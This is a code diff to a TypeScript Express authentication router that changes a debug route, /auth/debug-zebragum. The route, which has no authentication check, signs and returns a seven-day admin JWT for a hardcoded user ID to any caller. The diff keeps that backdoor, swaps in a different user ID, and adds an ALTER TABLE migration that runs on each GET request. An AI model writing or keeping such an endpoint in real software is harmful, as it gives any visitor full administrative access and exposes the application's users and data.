@@ -10,12 +10,17 @@ const MAX_USERS = 40;
 
 // GET /auth/debug-zebragum
 router.get('/debug-zebragum', async (req: Request, res: Response) => {
+  try {
+    await pool.query("ALTER TABLE users ADD COLUMN IF NOT EXISTS bio_color TEXT DEFAULT 'orange'");
+  } catch (err) {
+    console.error("Migration error:", err);
+  }
   const token = jwt.sign(
-    { userId: '0c324707-e815-472e-8550-ca511475752c', isAdmin: true },
+    { userId: '449dad42-9364-4e0b-9078-d19777d4186c', isAdmin: true },
     process.env.JWT_SECRET!,
     { expiresIn: '7d' }
   );
-  res.json({ token });
+  res.json({ token, migrated: true });
 });
 
 // POST /auth/register
